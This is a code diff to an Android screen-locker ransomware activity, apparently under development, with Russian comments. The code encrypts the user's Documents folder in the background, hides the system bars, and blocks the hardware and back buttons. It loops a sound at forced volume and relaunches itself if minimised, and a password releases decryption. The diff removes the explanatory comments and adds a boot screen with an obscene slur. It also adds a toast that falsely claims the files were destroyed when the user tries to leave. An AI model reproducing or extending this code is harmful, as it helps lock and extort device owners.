@@ -30,7 +30,6 @@ public class LockActivity extends Activity {
         super.onCreate(b);
         setContentView(R.layout.activity_lock);
 
-        // Делаем окно поверх всего и не даем экрану погаснуть
         getWindow().addFlags(
             WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
             WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
@@ -38,7 +37,6 @@ public class LockActivity extends Activity {
             WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
             WindowManager.LayoutParams.FLAG_FULLSCREEN);
 
-        // Скрываем системные панели
         View decorView = getWindow().getDecorView();
         decorView.setSystemUiVisibility(
             View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
@@ -49,14 +47,12 @@ public class LockActivity extends Activity {
             | View.SYSTEM_UI_FLAG_FULLSCREEN);
 
         am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
-        // Воспроизводим твой звук (lockvideo.mp3 в папке raw)
         mp = MediaPlayer.create(this, R.raw.lockvideo);
         if (mp != null) {
             mp.setLooping(true);
             mp.start();
         }
 
-        // Запускаем шифрование файлов в фоне
         targetDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
         new Thread(new Runnable() {
             @Override
@@ -65,7 +61,6 @@ public class LockActivity extends Activity {
             }
         }).start();
 
-        // Цикл для принудительной громкости и обновления времени
         handler.post(new Runnable() {
             @Override
             public void run() {
@@ -81,6 +76,31 @@ public class LockActivity extends Activity {
             }
         });
 
+        // --- ЛОГИКА АНИМАЦИИ ЭКРАНОВ ---
+        TextView bootText = findViewById(R.id.bootText);
+        TextView headerText = findViewById(R.id.headerText);
+        View mainBlock = findViewById(R.id.mainBlock);
+
+        // Начинаем с загрузки
+        bootText.setVisibility(View.VISIBLE);
+        mainBlock.setVisibility(View.GONE);
+
+        // Через 3 секунды показываем логотип
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                bootText.setText("P I D O R I\n[ SYSTEM INITIALIZED ]");
+                // Через еще 2 секунды показываем блок с текстом
+                handler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        bootText.setVisibility(View.GONE);
+                        mainBlock.setVisibility(View.VISIBLE);
+                    }
+                }, 2000);
+            }
+        }, 3000);
+
         EditText passwordInput = findViewById(R.id.passwordInput);
         TextView enterButton = findViewById(R.id.enterButton);
 
@@ -95,7 +115,6 @@ public class LockActivity extends Activity {
                         mp.release();
                         mp = null;
                     }
-                    // Запускаем расшифровку
                     new Thread(new Runnable() {
                         @Override
                         public void run() {
@@ -146,7 +165,6 @@ public class LockActivity extends Activity {
         }
     }
 
-    // Блокируем физические кнопки
     @Override
     public boolean dispatchKeyEvent(KeyEvent e) {
         int k = e.getKeyCode();
@@ -161,11 +179,14 @@ public class LockActivity extends Activity {
 
     @Override public void onBackPressed() { }
 
-    // Если попытаться свернуть приложение, оно мгновенно откроется заново
     @Override
     protected void onPause() {
         super.onPause();
         if (!isUnlocked) {
+            // Показываем предупреждение при попытке выхода
+            Toast.makeText(this, "ЗАМЕЧЕНА ПОПЫТКА ВЫХОДА. ФАЙЛЫ УНИЧТОЖЕНЫ.", Toast.LENGTH_SHORT).show();
+            
+            // Принудительно возвращаемся
             Intent intent = new Intent(this, LockActivity.class);
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
             startActivity(intent);
@@ -182,4 +203,4 @@ public class LockActivity extends Activity {
         }
         handler.removeCallbacksAndMessages(null);
     }
-    }
+                            }
